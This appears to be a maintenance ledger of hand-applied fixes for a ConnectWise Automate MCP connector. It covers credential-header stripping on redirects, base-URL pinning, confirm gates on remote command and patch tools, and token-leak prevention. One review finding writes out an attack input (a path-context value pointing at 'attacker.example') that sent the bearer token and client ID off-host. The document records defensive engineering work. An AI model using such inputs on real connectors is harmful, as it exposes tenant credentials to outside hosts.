_comment: Connector-specific edits a cli-printing-press reprint or onboard --resume must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and FAILS CI if a reprint dropped one.

handfixes.summary: manifest.json name/entry_point/command use the clean `connectwise-automate-mcp`, not the press `-pp-mcp`
handfixes.why: onboard.py re-copies the SOURCE manifest.json on every --resume, and the printing-press source keeps the `-pp-mcp` convention. The repo builds/ships `connectwise-automate-mcp`, so a stale `-pp-mcp` name/entry_point/command mismatches the .mcpb the release matrix produces. See project_onboard_manifest_deleak_and_envvar.

handfixes.summary: CONNECTWISE_AUTOMATE_CLIENT_ID is a required env var in manifest.json + server.json (per-request clientId header)
handfixes.why: config.go injects CONNECTWISE_AUTOMATE_CLIENT_ID as the `clientId` header on EVERY request for Automate v2020.11+; without it the MCP server 401s on modern servers. The press generated the manifest with only SERVER+TOKEN (the per-instance env-omission pattern), so a fresh reprint drops it again. See project_onboard_perinstance_baseurl_and_bareword_claims.

handfixes.summary: Hand-added an 'Endpoint and fleet actions' tier; gen_governance.py is method-blind and dropped `computers command-execute` entirely and mis-tiered `patching deploy-*` as routine
handfixes.why: ConnectWise Automate is an RMM whose members RUN CODE/PATCHES on live client endpoints. gen_governance.py keyword-matches and ignores pp:method, so `computers command-execute` (arbitrary command on an agent) fell out of the table and `patching deploy-approved`/`deploy-security`/`reattempt-failed` (fleet-wide patch deployment) landed in 'Write (routine)'. governance.md was rewritten to put all four under Endpoint/fleet, human-in-the-loop. A full reprint re-runs the classifier and reverts. See project_action1_onboard_traps + project_domotz_onboard_gotchas.

handfixes.summary: alert-triage --select example uses the real TriagedAlert json keys `client,computer,priority,message`, not `client_name,computer_name`
handfixes.why: The generated SKILL.md recipe asserted `--select client_name,computer_name,priority,message`, but fleet.TriagedAlert json tags are `client`/`computer`/`priority`/`message` (the binary's own --help example agrees). The wrong keys silently drop fields. See project_onboard_select_placeholder_fields.

handfixes.summary: SKILL.md + guide.md stay free of Printing Press / npx-library / public-library install leaks
handfixes.why: onboard.py only de-leaks the SKILL.md description, not the body H1/prereqs/HeyGen-Beacon/public-library lines or guide.md's npx install section. A reprint re-vendors both and re-introduces the leaks. See project_onboard_skillmd_guide_deleak.

handfixes.summary: doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential
handfixes.why: `doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` "reachable" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed "present, not verified" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as "FAIL API: unreachable" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.

handfixes.summary: every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)
handfixes.why: Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For connectwise-automate the manifest gained: CONNECTWISE_AUTOMATE_BASE_URL. server.json gained: CONNECTWISE_AUTOMATE_BASE_URL. mcp-install.md's env blocks gained: CONNECTWISE_AUTOMATE_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.
handfixes.spec_encode_followup: cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.

handfixes.summary: A redirect that leaves the origin (another host:port, or https down to http) carries no credential: every credential header and every config-file header is stripped, and a hop that would replay a request body (307/308 of a non-GET) is refused
handfixes.why: tools/maintainer/class_harness.py auth-wire found connectwise-automate sending the ClientId header (CONNECTWISE_AUTOMATE_CLIENT_ID, carried in Config.Headers) to a second server on a 307. The generated CheckRedirect deleted only the primary auth header on a cross-host hop; Go itself strips Authorization and Cookie only when the hostname changes (a port change keeps them), never strips a custom header, and replays the body on a 307 or 308, which for a token request is the client secret. Same-origin hops still re-derive auth (ninjaone precedent); a non-GET hop off the origin is refused rather than replayed (connectsecure precedent). The unit tests call the client's real CheckRedirect with every header Go copies onto the next hop and fail on the generated code. The origin compares like a URL: hostnames case-insensitively and an explicit default port as none (Codex review round 1: an upper-case base URL refused a healthy same-origin redirect). Hosts compare the way the network resolves them: an IP literal by address with its IPv6 zone exact, a DNS name ASCII case-insensitively, a non-ASCII name exactly (Codex review round 2: case-folding the zone let fe80::1%LAN0 pass for fe80::1%lan0).
handfixes.spec_encode_followup: Press-side: client.go.tmpl CheckRedirect should strip every credential header (the primary, composed siblings and config-file headers) on any hop that leaves the origin, compare host:port and scheme, and refuse to replay a body off the origin; a hand-written auth client should get the same CheckRedirect.

handfixes.summary: config.Load injects CONNECTWISE_AUTOMATE_CLIENT_ID as the `clientId` header on every request (Automate v2020.11+), only when set and never when the config's credential route is blocked
handfixes.why: ConnectWise Automate v2020.11+ rejects every request without the registered integration GUID in a `clientId` header. It is per-MSP, so the spec cannot carry it as a static header. The 4.24 print wired it in config.go by hand but the ledger pinned only the manifest/server.json declarations, so a reprint (this one included) silently dropped the code path while every gate stayed green; config_test.go TestClientIDHeaderInjected fails without it.
handfixes.spec_encode_followup: Press-side: an env-sourced per-tenant header (x-header-env-vars) the generator injects into Config.Headers and strips on a cross-origin redirect.

handfixes.summary: Every typed MCP endpoint tool that is not read-only (computers command-execute, patching deploy-approved/deploy-security/reattempt-failed, apitoken mint/refresh) returns a preview and sends nothing until confirm is boolean true
handfixes.why: Work-order rule: every MCP write previews and sends only with confirm: true. At 4.35.1 the generated endpoint tools for Automate's RMM actions (run a command on a live agent, fleet-wide patch deployment) sent on the first call. The gate wraps every registered non-read-only, non-mirrored tool, so an endpoint a later print adds is gated too (abnormal/skykick precedent). cwa_endpoint_confirm_test.go proves an unconfirmed call reaches the server 0 times and a confirmed one once; cwa_confirm_registered_test.go fails on the unwired tools.go (seen: logs/seen-mcp-confirm-fails.log).

handfixes.summary: Every mirrored (shell-out) MCP tool that may change ConnectWise Automate data (import today; any command a later print adds) previews with --dry-run and sends only with confirm boolean true
handfixes.why: Same contract as mcp-endpoint-write-confirm for the cobratree mirror. Fail closed: only read-only tools, mcp:local-write commands and the listed local-only commands (export, sync, workflow archive, learnings forget/reject) run without confirm.

handfixes.summary: `server info` is renamed `server get` in the spec (the 4.35 dogfood naming check bans the verb info); server_get.go keeps `info` as a Cobra alias
handfixes.why: The published 0.1.7 SKILL.md and guide.md document `server info`, and MCP clients and scripts call it. The rename lives in the spec (survives reprints); the alias is a hand line in the generated server_get.go (unifi-network application-info precedent).

handfixes.summary: The client pins the base URL resolved from the operator's config when it is built and refuses any request whose base resolves elsewhere later; `sync --path-context` refuses to set a base-URL placeholder ({server})
handfixes.why: Codex review round 1 (P1, credential sent to another host): `sync --path-context server=attacker.example`, also reachable as the MCP sync tool's path-context argument, rewrote Config.TemplateVars after the credentials were loaded, so the bearer token and the clientId went to a host the operator never configured, with no redirect involved. Tests: internal/cli/sync_host_pin_test.go (seen failing: logs/seen-r1-pathcontext-fails.log) and internal/client/host_pin_test.go (the client backstop on its own; seen failing with the check removed: logs/seen-r1-hostpin-fails.log).
handfixes.spec_encode_followup: Press-side: client.go.tmpl should resolve and pin the base URL at construction, and sync's --path-context should refuse base-URL placeholders, for every connector with a templated host.

handfixes.summary: sync records which record IDs each finished, unfiltered walk of alerts/clients/computers/locations/patching returned (store table cwa_walk); the fleet reports read only those records and refuse a mirror no such walk proves
handfixes.why: Codex review (P1, local mirror read as complete): the reports inferred walk membership from row timestamps, so a walk resumed after --max-pages dropped its first page, a live read's write-through (alerts get 7 returning a Closed alert) was reported as open, and a filtered walk (--resource-param computers:condition=...) was read as the whole fleet. The press leaves flatReconcileModes empty, so sync collected no seen IDs: the guard edit makes it collect them for the tracked resources. Tests: internal/cli/cwa_walk_test.go drives the real sync against a loopback fake server (seen failing first).
handfixes.spec_encode_followup: Press-side: sync could record per-resource walk membership (unfiltered, resumed across --max-pages) for any print whose novel commands aggregate the mirror.

handfixes.summary: README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.
handfixes.why: Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.
handfixes.spec_encode_followup: Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.

handfixes.summary: The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand. internal/credwire/declarations.go holds the one Declarations literal (the bearer token and clientId GUID from the environment, config and the 0600 credential store, the apitoken mint/refresh credential flags, body fields and MCP arguments, the minted AccessToken as a response field, the MCP HTTP bearer sent nowhere, Spacefast's token and page key bound to its API, the run profile stores held at startup); each main starts with credkit.Start and ends with credkit.Exit; every API, feedback, webhook, Spacefast and probe request goes through the kit's transport (cliutil.OutboundGuard around the origin pin and the redirect stripping); every SQLite handle goes through internal/credsql; every file write except the credential sources (credential store, config file, Spacefast page record: cliutil.AtomicWriteCredentialFile) goes through the kit; child processes run through credkit.RunCommand/StartCommand; stdout and stderr are the kit's pipes.
handfixes.why: The default base URL is the template https://{server}/cwa/api/v1, which the kit cannot parse, so credwire resolves {server} the way config.Load and the client do and shows the kit the result for the start only (AfterStart restores the environment); with no server configured the template allows no origin and a credentialed request is refused, never sent to the YOUR_SERVER placeholder. A reprint regenerates every DO NOT EDIT file listed here and would silently unwire the kit while the build stays green; internal/credwire/leak_test.go runs the built binaries (token echo in an API error, off-origin and plain-http refusal, profile and malformed-config values held at startup, the journal, feedback --stdin, the Spacefast token, the {server} origin) and every case failed on the pre-wiring tree (.review/seen-kit-leak-all-fails.log in the onboarding worktree).
handfixes.spec_encode_followup: Press-side: generate the kit wiring (Start/Exit in both mains, MCPTools middleware, MCPIn/MCPOut stdio, MCPHTTP outermost, one guarded transport, one kit SQLite driver, kit file writers, credential-source writes declared) and a Declarations literal from the spec's auth section, including a resolver for a templated base URL.

handfixes.summary: A config save (auth set-token, apitoken mint, any SaveTokens) writes the config file's own [headers] clientId, never the CONNECTWISE_AUTOMATE_CLIENT_ID value config.Load injected from the environment.
handfixes.why: config.Load injects the environment's integration GUID into Headers (clientid-header-injected) without marking it as an environment override, and save() persists Headers, so `auth set-token` copied a credential the operator kept in the environment into config.toml, where it outlived the environment and a later unset. config.go now marks the injection and configForSave restores the file's clientId (or none). cwa_clientid_save_test.go TestEnvClientIDNeverSaved failed on the unfixed config.go (seen: .review/seen-kit-clientid-fails.log in the onboarding worktree).
handfixes.spec_encode_followup: Press-side: the env-sourced per-tenant header (clientid-header-injected's followup) should be an environment override the generated configForSave already restores.

handfixes.summary: apitoken mint and apitoken refresh save the minted AccessToken to the 0600 credential store (as auth set-token does) and print and mirror the TokenResult with AccessToken naming where it went; over MCP, apitoken_mint and apitoken_refresh send nothing and name the CLI command (internal/mcp/cwa_endpoint_confirm.go terminalOnlyTools), because the kit would withhold the answer and the new token would be lost.
handfixes.why: The TokenResult's AccessToken is the bearer token. The generated commands printed it and wrote it to the local SQLite mirror (the apitoken table and the resources row), and the MCP tools returned it to the agent. With the kit it is a held response field, so the whole answer would be withheld and the minted token lost; saving it closes the loop instead. leak_test.go TestMintedTokenNeverPrintedOrMirrored failed on the pre-wiring tree (seen: .review/seen-kit-minted-fails.log in the onboarding worktree).
handfixes.spec_encode_followup: Press-side: a token-minting endpoint (x-mints-credential) whose generated command saves the response credential to the credential store and never prints or mirrors it.

handfixes.summary: The unconfirmed preview of an MCP endpoint write names each credential argument (the MCPArguments credwire declares) with a placeholder instead of its value. apitoken_mint and apitoken_refresh, the endpoint writes that take one today, refuse over MCP before any preview; the placeholder covers any later endpoint write that does.
handfixes.why: mcp-endpoint-write-confirm's preview repeated every argument, so an unconfirmed apitoken_mint echoed the password and two-factor passcode and apitoken_refresh the current token to the MCP client. The kit would withhold the whole preview; the placeholder keeps the preview useful. leak_test.go TestMCPWritePreviewNeverEchoesACredential failed on the pre-wiring tree (seen: .review/seen-kit-preview-fails.log in the onboarding worktree).

handfixes.summary: sync wraps the event writer its parallel workers share in syncSerialWriter (internal/cli/sync_event_writer.go), so two workers never call Write on it at once.
handfixes.why: The generated sync hands cmd.OutOrStdout() (or ErrOrStderr() in machine output) to every --concurrency worker, and each writes sync_start, progress and error events. os.Stdout tolerates that; the writers --deliver (a mirror into a bytes.Buffer) and --receipt-file / --audit-dir (a running SHA-256) install do not, nor does an in-process caller's buffer: Windows CI on PR #655 panicked in bytes.Buffer.grow from syncResource, and go test -race found 28 races on veeam. TestSyncWorkerPoolSerializesEventWrites pins it. A reprint regenerates sync.go and drops the wrap; tools/maintainer/replay_handfixes.py re-applies it (fleet_handfixes.json sync-event-writer-serialized).
handfixes.spec_encode_followup: Press-side (mvanhorn/cli-printing-press#5369): the sync template should serialize the event writer its top-level worker pool shares, as its dependent path already does with lockedWriter.

retired.reason: tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so "db=/path" is refused) and skips '=' names in cliArgsFromMCP.

tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag.

tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard.

tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name.
